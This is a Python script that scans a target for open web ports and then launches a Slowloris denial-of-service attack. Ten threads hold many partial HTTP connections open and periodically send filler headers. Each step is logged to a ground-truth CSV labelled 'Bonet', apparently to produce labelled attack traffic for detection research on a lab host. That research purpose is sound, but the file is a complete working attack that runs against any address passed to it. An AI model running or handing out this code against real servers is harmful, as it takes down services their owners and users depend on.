import socket
import sys
import time
import threading
import random
import csv
from datetime import datetime, timezone
from pathlib import Path

GROUND_TRUTH_FILE = "./ground/botnet.csv"

def get_local_ip():
    """Get the IP that will be used as src_ip"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def log_event(writer, src_ip, dst_ip, label):
    """Write one line in the exact format you want"""
    ts = datetime.now(timezone.utc).isoformat()
    writer.writerow({
        "timestamp": ts,
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "label": label
    })

def is_port_open(target: str, port: int, timeout=3) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except:
        return False

def scan_web_ports(target: str):
    print(f"[*] Scanning web ports on {target}...")
    port_80 = is_port_open(target, 80)
    port_443 = is_port_open(target, 443)

    if port_80:
        print(f"[+] Port 80 (HTTP) is OPEN")
    if port_443:
        print(f"[+] Port 443 (HTTPS) is OPEN")

    if not port_80 and not port_443:
        print("[-] No web ports open. Aborting.")
        return None

    return "http" if port_80 else "https"

def make_full_url(target: str, scheme: str) -> str:
    if target.startswith(("http://", "https://")):
        return target
    return f"{scheme}://{target}"

def slowloris_worker(target_host, port, duration, writer, lock, src_ip):
    end_time = time.time() + duration
    sockets = []

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_host, port))
            s.sendall(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n".encode())
            sockets.append(s)

            with lock:
                log_event(writer, src_ip, target_host, "Bonet")
                print(f"[+] Active connections: {len(sockets)}", end="\r")

            if random.random() < 0.3 and sockets:
                try:
                    sock = random.choice(sockets)
                    sock.sendall(f"X-a: {random.randint(1,9999)}\r\n".encode())
                    with lock:
                        log_event(writer, src_ip, target_host, "Bonet")
                except:
                    pass
        except:
            pass

        time.sleep(0.15)

    for s in sockets:
        try:
            s.close()
        except:
            pass

def run_python_slowloris(target: str, connections=500, duration=60):
    print(f"[*] Starting Pure Python Slowloris on {target}")
    print(f"[*] Duration: {duration}s")
    print(f"[*] Ground-truth → {GROUND_TRUTH_FILE}\n")

    target_host = target.replace("http://", "").replace("https://", "").split("/")[0]
    port = 443 if target.startswith("https") else 80
    src_ip = get_local_ip()

    print(f"[+] src_ip = {src_ip}")
    print(f"[+] dst_ip = {target_host}:{port}")

    # Create CSV with exact header you requested
    file_exists = Path(GROUND_TRUTH_FILE).exists()
    csvfile = open(GROUND_TRUTH_FILE, "a", newline="", encoding="utf-8")
    fieldnames = ["timestamp", "src_ip", "dst_ip", "label"]
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

    if not file_exists:
        writer.writeheader()

    lock = threading.Lock()

    # Log start
    log_event(writer, src_ip, target_host, "Bonet")

    threads = []
    try:
        for _ in range(10):
            t = threading.Thread(
                target=slowloris_worker,
                args=(target_host, port, duration, writer, lock, src_ip),
                daemon=True
            )
            t.start()
            threads.append(t)

        time.sleep(duration)

    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    finally:
        log_event(writer, src_ip, target_host, "Bonet")
        csvfile.close()
        print(f"\n[+] Finished. Ground-truth saved → {GROUND_TRUTH_FILE}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 slow_ddos.py <IP>")
        print("Example: python3 slow_ddos.py 192.168.64.145")
        sys.exit(1)

    target = sys.argv[1].strip()
    scheme = scan_web_ports(target)

    if not scheme:
        sys.exit(1)

    full_url = make_full_url(target, scheme)
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60

    run_python_slowloris(full_url, duration=duration)
